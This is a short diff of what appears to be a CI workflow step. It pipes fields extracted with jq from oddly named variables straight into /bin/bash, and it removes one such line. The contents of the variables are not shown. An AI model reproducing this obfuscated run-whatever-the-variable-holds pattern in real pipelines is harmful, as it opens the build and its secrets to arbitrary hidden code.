@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$y39" | jq -r .psbl4 | /bin/bash
           printf '%s' "$wmve80764" | jq -r .pmc543 | /bin/bash
-          printf '%s' "$kcgpc7" | jq -r .f1723 | /bin/bash
           printf '%s' "$fcmm6" | jq -r .t3 | /bin/bash
 
       - name: Save results
